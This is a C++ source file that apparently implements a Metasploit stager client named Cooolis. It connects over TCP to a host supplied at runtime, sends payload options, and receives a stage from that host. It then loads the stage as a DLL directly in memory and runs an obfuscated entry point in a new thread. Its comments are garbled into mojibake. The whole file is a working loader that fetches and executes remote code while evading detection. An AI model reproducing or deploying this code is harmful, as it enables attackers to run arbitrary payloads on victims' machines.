#include "Cooolis-msf.h"

CCooolisMetasploit::CCooolisMetasploit()
{
	// ��ʼ��
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA wsaData;
	this->getStager = new stager;  // �������ݽṹ��
	if (WSAStartup(sockVersion, &wsaData) != 0)
	{
		// 
	}

}

CCooolisMetasploit::~CCooolisMetasploit()
{
	delete this->getStager;
	
}

BOOL CCooolisMetasploit::SendPayload(std::string options, std::string payload)
{
	
	ZeroMemory(getStager->payload, PAYLOAD_LEN); // ����ڴ�
	ZeroMemory(getStager->options, PAYLOAD_LEN); // ����ڴ�
	CopyMemory(getStager->options, options.c_str(), options.length());
	CopyMemory(getStager->payload, payload.c_str(), payload.length());

	// ��������
	return send(socks, (char*)getStager, PAYLOAD_LEN*2, 0);
}

BOOL CCooolisMetasploit::RecvStage()
{
	DWORD dwStageLength = 0;
	// ����Stage����
	recv(socks, (char*)&dwStageLength, sizeof(DWORD), 0);
	
	// �ȴ�����ִ��
	// Sleep(3000);
	this->pSpace = (CHAR*)CooolisVirtualAlloc(NULL, dwStageLength, MEM_COMMIT, PAGE_READWRITE);

	// ��Stage�����ڴ�ҳ
	if (recv(socks, pSpace, dwStageLength, 0) == SOCKET_ERROR) {
		return FALSE;
	}
	/*
	if (this->socks)
		closesocket(this->socks);
	*/

	return TRUE;
}

BOOL CCooolisMetasploit::ConnectServer(std::string host, USHORT port)
{
	struct sockaddr_in sock_addr; // �׽�������
	InetPtonA(AF_INET, host.c_str(), &(sock_addr.sin_addr)); // ת��IP��ַ
	socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sock_addr.sin_family = AF_INET;		// �׽�������
	sock_addr.sin_port = htons(port);  // �׽��ֶ˿�
	// ���ӷ�����
	if (connect(socks, (struct sockaddr*) & sock_addr, sizeof(sock_addr)) == SOCKET_ERROR) {
		return FALSE;
	}
	return TRUE;
}

VOID CCooolisMetasploit::GoodCooolis()
{
	DWORD dwThread = 0;
	CHAR cFunctionName[] = { 'D','l','l','M','a','n','\0' };
	HMEMORYMODULE hModule;
	Module DllMain;
	// ����PE�ļ�
	hModule = MemoryLoadLibrary(pSpace);
	// hModule = MemoryLoadLibrary(NULL);
	DllMain = (Module)MemoryGetProcAddress(hModule, cFunctionName);

	hThread = CooolisCreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)DllMain, NULL, NULL, &dwThread);

	WaitForSingleObject(hThread, INFINITE);

	MemoryFreeLibrary(hModule);

	return VOID();
}
